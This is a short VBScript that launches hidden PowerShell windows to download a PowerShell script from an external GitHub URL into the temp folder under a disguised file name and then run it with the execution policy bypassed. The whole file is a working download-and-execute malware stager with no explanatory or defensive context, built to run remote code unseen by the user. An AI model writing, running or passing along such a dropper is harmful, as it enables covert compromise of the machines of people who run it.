Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'https://github.com/nickfour/temp-sc/blob/main/dis11sec.ps1?raw=true' -OutFile '$env:TEMP\DLLvaa.ps1'\"", 0, True
WScript.Sleep 1200
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -File '$env:TEMP\DLLvaa.ps1'", 0, False
